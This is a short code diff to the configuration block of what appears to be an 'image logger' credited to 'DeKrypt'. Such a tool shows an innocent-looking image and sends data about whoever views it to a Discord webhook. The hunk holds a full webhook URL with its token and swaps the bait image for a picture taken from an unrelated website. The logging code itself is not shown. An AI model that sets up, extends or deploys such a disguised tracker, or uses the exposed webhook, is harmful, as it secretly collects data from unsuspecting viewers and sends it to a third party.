@@ -13,7 +13,7 @@ author= "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1503916378435096620/5IMfiGVdvKwpRioZLoOEodV69Tby7X5oDBbdT20eozRme-OLqz19kW_gJrlf_nnryCee",
-    "image": "https://cdn.discordapp.com/attachments/1450827126608625757/1503916712498827404/image.png?ex=6a051715&is=6a03c595&hm=2a74bd0560142e9b909d30c1232767409a581d582fafdcca010ccdcf7d473d18&", # You can also have a custom image by using a URL argument
+    "image": "https://chargeraccount.org/wp-content/uploads/2023/06/K7Kk3DSxN0r4AVhONa9ruggbas3DWRIrbnHw1dJc-1-900x600.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
